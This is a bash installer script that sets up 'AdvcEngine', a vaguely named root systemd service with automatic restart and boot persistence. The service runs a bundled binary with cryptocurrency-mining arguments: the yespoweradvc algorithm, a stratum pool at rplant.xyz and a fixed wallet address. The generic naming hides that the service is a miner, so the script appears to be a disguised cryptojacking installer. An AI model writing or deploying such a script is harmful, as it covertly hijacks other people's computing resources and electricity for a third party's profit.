#!/bin/bash

set -e

echo "==============================="
echo " Installing AdvcEngine Service "
echo "==============================="

# 1. Create directories
echo "[1/6] Creating directories..."
sudo mkdir -p /opt/advcengine
sudo touch /var/log/advcengine.log
sudo chmod 644 /var/log/advcengine.log

# 2. Copy your executable
echo "[2/6] Installing executable..."
if [ ! -f ./page ]; then
    echo "ERROR: Please place your 'page' binary in the same folder as this installer."
    exit 1
fi

sudo cp ./page /opt/advcengine/advcengine
sudo chmod +x /opt/advcengine/advcengine

# 3. Create the background loop script
echo "[3/6] Creating worker script..."

sudo bash -c 'cat > /opt/advcengine/advcengine.sh <<EOF
#!/bin/bash

# ----------------------------------------------------
# AdvcEngine Worker
# ----------------------------------------------------

EXEC="/opt/advcengine/advcengine"
ARGS="-a yespoweradvc -o stratum+tcps://na.rplant.xyz:17149 -u AP6RvXmfxUiwvihWB7LVgs4UEckqJPxiqi"

MIN_DELAY=32
MAX_DELAY=62

while true; do
    echo "[\$(date "+%Y-%m-%d %H:%M:%S")] Running AdvcEngine..." >> /var/log/advcengine.log

    \$EXEC \$ARGS

    SLEEP_TIME=\$(( RANDOM % (MAX_DELAY - MIN_DELAY + 1) + MIN_DELAY ))
    sleep \$SLEEP_TIME
done
EOF'

sudo chmod +x /opt/advcengine/advcengine.sh


# 4. Create systemd service
echo "[4/6] Creating systemd service..."

sudo bash -c 'cat > /etc/systemd/system/advcengine.service <<EOF
[Unit]
Description=AdvcEngine Background Worker
After=network.target

[Service]
WorkingDirectory=/opt/advcengine
ExecStart=/opt/advcengine/advcengine.sh
Restart=always
RestartSec=5
StandardOutput=append:/var/log/advcengine.log
StandardError=append:/var/log/advcengine.log
User=root

[Install]
WantedBy=multi-user.target
EOF'

# 5. Reload + enable + start service
echo "[5/6] Enabling service..."
sudo systemctl daemon-reload
sudo systemctl enable advcengine
sudo systemctl start advcengine

# 6. Finish
echo "[6/6] Installation complete!"
echo "-----------------------------------------------"
echo " Service name: advcengine"
echo " Log file:     /var/log/advcengine.log"
echo " Directory:    /opt/advcengine/"
echo "-----------------------------------------------"
echo "AdvcEngine is now running."
